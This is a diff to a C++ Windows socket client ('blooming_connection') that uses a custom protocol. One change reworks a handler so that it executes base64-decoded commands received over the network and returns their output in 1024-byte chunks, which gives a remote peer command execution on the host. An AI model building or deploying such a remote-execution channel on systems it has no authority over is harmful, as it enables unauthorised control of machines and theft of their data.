@@ -1,6 +1,7 @@
 #include <iostream>
 #include <thread>
 #include <winsock.h>
+#include <Windows.h>
 #include <string>
 #include <fstream>
 #include <ctime>
@@ -93,7 +94,7 @@ class blooming_connection
 
     void blooming_init()
     {
-        send(sock, head.c_str(), strlen(head.c_str()), 0);
+        send(sock, head.c_str(), text_size(head.c_str()), 0);
     }
 
     void blooming_command_formator()
@@ -187,7 +188,7 @@ class blooming_connection
         if (command_type != 'h')
         {
             result = "bloom-in " + command_type_identifer + " <channel>" + channel + "<channel><id>" + local_id + "<id>" + "<target>" + command_target + "<target>" + "<data>" + b64_en((char *)command_content.c_str()) + "<data>BLOOM_IN";
-            send(sock, result.c_str(), strlen(result.c_str()), 0);
+            send(sock, result.c_str(), text_size(result.c_str()), 0);
         }
     }
 
@@ -197,7 +198,6 @@ class blooming_connection
         string command_content;
 
         command_type = recv_buffer[9];
-        // cout << recv_buffer << endl;
 
         time_t now = time(0);
         string str_now = ctime(&now);
@@ -214,9 +214,24 @@ class blooming_connection
             break;
         case 'e':
         {
+            // printf("%s", b64_de(__data));
+            vector<string> __execution_result_list;
             string __execution_result = __execute(b64_de(__data));
-            string result = "bloom-in p <channel>" + __channel + "<channel><id>" + local_id + "<id>" + "<target>" + __id + "<target>" + "<data>" + b64_en((char *)__execution_result.c_str()) + "<data>BLOOM_IN";
-            send(sock, result.c_str(), strlen(result.c_str()), 0);
+
+            for (int i = 0; i < text_size(__execution_result); i = i + 1024)
+            {
+                __execution_result_list.push_back(__execution_result.substr(i, 1024));
+            }
+
+            for (int i = 0; i < __execution_result_list.size(); i++)
+            {
+                string result = "bloom-in p <channel>" + __channel + "<channel><id>" + local_id + "<id>" + "<target>" + __id + "<target>" + "<data>" + b64_en((char *)__execution_result_list[i].c_str()) + "<data>BLOOM_IN";
+                // cout << result << endl;
+                send(sock, result.c_str(), text_size(result.c_str()), 0);
+                Sleep(100);
+            }
+
+            // send(sock, result.c_str(), text_size(result.c_str()), 0);
             printf("--------------------\n");
             printf("@%s\t%s executes:\n", str_now.c_str(), __id.c_str());
             printf("\t\t%s\n", b64_de(__data).c_str());
@@ -286,7 +301,7 @@ class blooming_connection
 
     void blooming_end()
     {
-        send(sock, exit.c_str(), strlen(exit.c_str()), 0);
+        send(sock, exit.c_str(), text_size(exit.c_str()), 0);
         closesocket(sock);
         WSACleanup();
     }
